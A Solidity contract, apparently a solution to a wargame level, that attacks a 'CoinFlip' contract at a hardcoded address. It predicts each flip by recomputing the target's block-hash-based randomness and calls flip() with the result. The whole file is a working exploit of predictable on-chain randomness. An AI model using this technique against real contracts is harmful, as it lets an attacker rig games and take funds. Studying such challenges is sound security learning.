// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipContract =
        CoinFlip(0xeb4010f0F1c235C031dEb19caC3c0340751f2297);

    function HackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}